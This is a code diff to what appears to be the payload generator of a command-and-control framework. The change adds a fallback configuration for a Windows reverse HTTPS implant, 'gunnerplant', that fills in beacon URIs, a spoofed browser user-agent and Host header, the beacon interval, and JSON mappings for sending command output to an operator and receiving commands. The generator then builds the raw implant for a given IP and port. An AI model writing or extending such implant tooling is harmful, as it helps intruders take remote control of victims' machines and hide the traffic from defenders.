@@ -5,6 +5,7 @@ import json
 import subprocess
 import shutil
 from pathlib import Path
+from types import SimpleNamespace
 from core.payload_generator.common import payload_utils as payutils
 from core.payload_generator.common.payload_utils import XorEncode
 from core.payload_generator.windows.https.gunnerplant import build_make
@@ -220,6 +221,30 @@ def generate_gunnerplant_reverse_https(ip, port, obs, beacon_interval, headers, 
 			"transport": scheme,
 		}
 		cfg = loader_cls().load(prof, defaults=defaults)
+
+	else:
+		# No profile → still honor the GUI fields (headers, UA, accept, range, beacon)
+		h = headers or {}
+		cfg = SimpleNamespace(
+			# URIs
+			get_uri="/",
+			post_uri="/",
+			# Headers
+			headers_get=h,
+			headers_post={k: v for k, v in h.items() if k.lower() != "content-length"},
+			# Common header-ish fields
+			useragent=useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+			accept=accept,
+			host=h.get("Host"),
+			byte_range=byte_range,               # handled safely in make_raw (numeric-only AddRange)
+			accept_post=accept,
+			host_post=h.get("Host"),
+			# Timing
+			interval_ms=int(beacon_interval) * 1000 if beacon_interval else None,
+			# Mapping defaults so POST body is {"output":"<b64>"} and GET extracts JSON "output"/"cmd"/"Telemetry"
+			get_server_mapping={},
+			post_client_mapping={"output": "{{payload}}"},
+		)
 
 	raw = make_raw(ip, port, cfg=cfg, scheme=scheme)
 	print(raw)
